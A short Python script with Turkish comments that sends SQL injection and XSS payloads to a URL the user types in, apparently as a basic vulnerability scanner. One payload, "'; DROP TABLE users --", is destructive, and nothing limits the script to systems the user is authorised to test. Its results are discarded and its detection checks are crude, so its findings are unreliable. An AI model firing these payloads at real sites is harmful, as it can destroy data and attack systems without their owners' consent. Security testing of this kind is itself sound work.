import requests

def send_request(url):
    try:
        response = requests.get(url)
        return response
    except requests.exceptions.RequestException as e:
        print(f"[X] Hata: {e}")
        return None

def test_sql_injection(url):
    """Basit bir SQL Injection testi yapar."""
    payloads = ["' OR '1'='1", "'; DROP TABLE users --"]
    results = []  # 🔥 Sonuçları bu listeye ekleyeceğiz
    
    for payload in payloads:
        test_url = f"{url}&payload={payload}"
        response = send_request(test_url)

        if response and ("error" in response.text.lower() or "mysql" in response.text.lower()):
            results.append(f"[!] Güvenlik Açığı Bulundu: SQL Injection - {test_url}")
        else:
            results.append(f"[✓] Güvenli: {test_url}")

    return results  # 🔥 Artık sonuçları geri döndürüyoruz!

def test_xss(url):
    """Basit bir XSS testi yapar."""
    payloads = ["<script>alert('XSS')</script>", "<img src=x onerror=alert('XSS')>"]
    results = []  # 🔥 Sonuçları bu listeye ekleyeceğiz
    
    for payload in payloads:
        test_url = f"{url}&payload={payload}"
        response = send_request(test_url)

        if response and "<script>" in response.text.lower():
            results.append(f"[!] Güvenlik Açığı Bulundu: XSS - {test_url}")
        else:
            results.append(f"[✓] Güvenli: {test_url}")

    return results  # 🔥 Artık sonuçları geri döndürüyoruz!
if __name__ == "__main__":
    target_url = input("Test etmek istediğin URL'yi gir: ")
    test_sql_injection(target_url)
    test_xss(target_url)
